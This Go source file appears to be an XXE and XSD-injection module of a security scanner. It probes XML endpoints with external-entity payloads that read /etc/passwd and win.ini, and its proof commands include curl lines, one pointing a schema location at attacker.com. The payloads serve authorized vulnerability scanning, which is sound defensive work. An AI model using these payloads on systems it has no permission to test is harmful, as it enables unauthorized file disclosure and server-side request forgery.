// Package xxe probes XML-accepting endpoints for XML External Entity (XXE)
// injection vulnerabilities.
//
// It discovers XML endpoints by probing common API paths with a Content-Type
// of application/xml or text/xml, then injects XXE payloads and checks whether
// the server echoes /etc/passwd content or internal file data in its response.
//
// Active exploitation probes require ScanAuthorized mode (--authorized flag).
// ScanAuthorized only (active payloads that attempt file reads).
package xxe

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
)

const (
	scannerName = "xxe"
	maxBodySize = 64 * 1024
)

// xmlProbeBody is a minimal XML document sent to detect XML parsing.
const xmlProbeBody = `<?xml version="1.0" encoding="UTF-8"?><probe><test>beacon</test></probe>`

// xxePayloads are XXE injection documents targeting common file disclosure paths.
var xxePayloads = []struct {
	name    string
	payload string
	// indicator is a string expected in the response if XXE succeeded.
	indicator string
}{
	{
		name: "Linux /etc/passwd",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
		indicator: "root:",
	},
	{
		name: "Windows win.ini",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>`,
		indicator: "[fonts]",
	},
}

// xsdPayloads test for XSD (XML Schema) injection via remote schema loading.
// If the server fetches the remote schema, it confirms SSRF via XML parsing.
var xsdPayloads = []struct {
	name    string
	payload string
}{
	{
		name: "XSD import remote schema",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="http://xsd-canary.beacon.invalid/schema.xsd">
<data>test</data></root>`,
	},
	{
		name: "XSD schemaLocation",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<root xmlns="http://example.com/ns"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://example.com/ns http://xsd-canary.beacon.invalid/schema.xsd">
<data>test</data></root>`,
	},
}

// xmlPaths are common API paths likely to accept XML input.
var xmlPaths = []string{
	"/api",
	"/api/v1",
	"/api/v2",
	"/upload",
	"/import",
	"/parse",
	"/process",
	"/soap",
	"/ws",
	"/webservice",
	"/xml",
	"/rss",
	"/feed",
	"/sitemap.xml",
}

// xmlContentTypes are MIME types to try for XML submissions.
var xmlContentTypes = []string{
	"application/xml",
	"text/xml",
}

// Scanner probes for XXE injection vulnerabilities.
type Scanner struct{}

// New returns a new Scanner.
func New() *Scanner { return &Scanner{} }

// Name returns the stable scanner identifier.
func (s *Scanner) Name() string { return scannerName }

// Run executes the XXE scan. Deep mode only.
func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	// Exploitation probes require --authorized (beyond --deep).
	if scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	base := schemedetect.Base(ctx, client, asset)

	// Phase 1: discover XML-accepting endpoints.
	xmlEndpoints := discoverXMLEndpoints(ctx, client, base)
	if len(xmlEndpoints) == 0 {
		return nil, nil
	}

	var findings []finding.Finding

	for _, endpoint := range xmlEndpoints {
		for _, p := range xxePayloads {
			f := probeXXE(ctx, client, asset, endpoint, p.name, p.payload, p.indicator)
			if f != nil {
				findings = append(findings, *f)
				// One finding per endpoint is sufficient.
				break
			}
		}
		if ctx.Err() != nil {
			break
		}
	}

	// XSD injection: detect via response timing. If the server attempts to
	// fetch the remote schema, the request takes longer (DNS resolution +
	// connection timeout to non-existent host).
	for _, endpoint := range xmlEndpoints {
		if ctx.Err() != nil {
			break
		}
		for _, xsd := range xsdPayloads {
			f := probeXSD(ctx, client, asset, endpoint, xsd.name, xsd.payload)
			if f != nil {
				findings = append(findings, *f)
				break
			}
		}
	}

	return findings, nil
}

// probeXSD sends an XSD injection payload and detects schema fetching via timing.
// If the server takes significantly longer to respond (>2s vs baseline), it's
// likely attempting to resolve the canary domain, confirming SSRF via XML parsing.
func probeXSD(ctx context.Context, client *http.Client, asset, url, payloadName, payload string) *finding.Finding {
	// Baseline: send a normal XML document and measure response time.
	baseReq, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
		bytes.NewBufferString(xmlProbeBody))
	if err != nil {
		return nil
	}
	baseReq.Header.Set("Content-Type", "application/xml")
	baseStart := time.Now()
	baseResp, err := client.Do(baseReq)
	if err != nil {
		return nil
	}
	io.Copy(io.Discard, baseResp.Body)
	baseResp.Body.Close()
	baseLatency := time.Since(baseStart)

	// XSD probe: send the schema injection payload.
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
		bytes.NewBufferString(payload))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/xml")
	xsdStart := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	resp.Body.Close()
	xsdLatency := time.Since(xsdStart)

	// If XSD response is >2s slower than baseline, the server likely attempted
	// to fetch the remote schema (DNS resolution + connection timeout).
	timeDelta := xsdLatency - baseLatency
	if timeDelta < 2*time.Second {
		// Also check if the response body mentions the schema URL — some parsers
		// include error messages about failed schema fetches.
		bodyStr := strings.ToLower(string(body))
		if !strings.Contains(bodyStr, "xsd-canary.beacon.invalid") &&
			!strings.Contains(bodyStr, "schema") {
			return nil
		}
	}

	return &finding.Finding{
		CheckID:  finding.CheckWebXSDInjection,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Title:    fmt.Sprintf("XML Schema (XSD) Injection — %s", payloadName),
		Description: fmt.Sprintf(
			"The endpoint %s attempts to fetch remote XML Schema (XSD) references embedded in "+
				"submitted XML documents. An attacker can use this to perform SSRF by pointing "+
				"schema locations to internal services, or to exfiltrate data via DNS/HTTP callbacks "+
				"to attacker-controlled servers.",
			url),
		Asset:    asset,
		DeepOnly: true,
		ProofCommand: fmt.Sprintf(
			`curl -s -X POST '%s' -H 'Content-Type: application/xml' `+
				`-d '<?xml version="1.0"?><root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" `+
				`xsi:noNamespaceSchemaLocation="http://attacker.com/schema.xsd"><data>test</data></root>'`,
			url),
		Evidence: map[string]any{
			"url":            url,
			"payload":        payloadName,
			"base_latency":   baseLatency.Milliseconds(),
			"xsd_latency":    xsdLatency.Milliseconds(),
			"timing_delta_ms": timeDelta.Milliseconds(),
		},
		DiscoveredAt: time.Now(),
	}
}

// discoverXMLEndpoints finds paths that respond to XML POST requests.
func discoverXMLEndpoints(ctx context.Context, client *http.Client, base string) []string {
	var endpoints []string
	for _, path := range xmlPaths {
		endpointURL := base + path
		for _, ct := range xmlContentTypes {
			req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpointURL,
				bytes.NewBufferString(xmlProbeBody))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", ct)
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			// Accept any 2xx non-HTML response as a potential XML endpoint.
			// We cannot require the response to be XML because many servers
			// (e.g. Spring Boot REST) accept XML input but always respond with
			// JSON. The only filter we apply is:
			//   - status must be 2xx (not 404/405/501)
			//   - response must not be text/html (SPA catch-all routes
			//     typically return HTML for every unknown path)
			respCT := resp.Header.Get("Content-Type")
			isHTML := strings.Contains(respCT, "text/html")

			validStatus := resp.StatusCode >= 200 && resp.StatusCode < 300

			if validStatus && !isHTML {
				endpoints = append(endpoints, endpointURL)
				break
			}
		}
		if ctx.Err() != nil {
			break
		}
	}
	return endpoints
}

// probeXXE sends an XXE payload to an endpoint and checks for the indicator.
func probeXXE(ctx context.Context, client *http.Client, asset, url, payloadName, payload, indicator string) *finding.Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
		bytes.NewBufferString(payload))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	resp.Body.Close()

	if !strings.Contains(string(body), indicator) {
		return nil
	}

	return &finding.Finding{
		CheckID:  finding.CheckWebXXE,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("XML External Entity (XXE) Injection — %s", payloadName),
		Description: fmt.Sprintf(
			"The endpoint %s processed an XML External Entity reference and returned file contents. "+
				"XXE can be used to read arbitrary files from the server filesystem, perform "+
				"server-side request forgery (SSRF), or execute denial-of-service attacks.",
			url),
		Asset:    asset,
		DeepOnly: true,
		ProofCommand: fmt.Sprintf(
			`curl -s -X POST '%s' -H 'Content-Type: application/xml' `+
				`-d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | grep 'root:'`,
			url),
		Evidence: map[string]any{
			"url":       url,
			"payload":   payloadName,
			"indicator": indicator,
		},
		DiscoveredAt: time.Now(),
	}
}

